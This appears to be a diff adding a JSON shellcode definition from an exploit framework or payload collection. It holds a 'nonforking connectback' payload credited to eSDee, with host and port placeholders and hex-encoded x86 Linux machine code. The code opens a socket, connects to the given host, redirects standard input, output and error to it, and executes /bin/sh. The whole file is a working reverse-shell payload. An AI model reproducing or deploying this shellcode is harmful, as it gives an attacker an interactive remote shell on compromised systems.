@@ -1,0 +1,36 @@
+{
+	"description" : "nonforking connectback, host/port can be specified",
+	"author"      : "eSDee <esdee@netric.org>",
+	"parameters"  : [
+		{
+			"name"        : "host",
+			"type"        : "ip",
+			"placeholder" : "badc0ded"
+		},
+
+		{
+			"name"        : "port",
+			"type"        : "u16be",
+			"placeholder" : "b0ef"
+		}
+	],
+	"code" : [
+		"31c031db31c951b1",
+		"0651b10151b10251",
+		"89e1b301b066cd80",
+		"89c231c031c95151",
+		"68badc0ded6668b0",
+		"efb102665189e7b3",
+		"1053575289e1b303",
+		"b066cd8031c939c1",
+		"740631c0b001cd80",
+		"31c0b03f89d3cd80",
+		"31c0b03f89d3b101",
+		"cd8031c0b03f89d3",
+		"b102cd8031c031d2",
+		"50686e2f7368682f",
+		"2f626989e3505389",
+		"e1b00bcd8031c0b0",
+		"01cd80"
+	]
+}
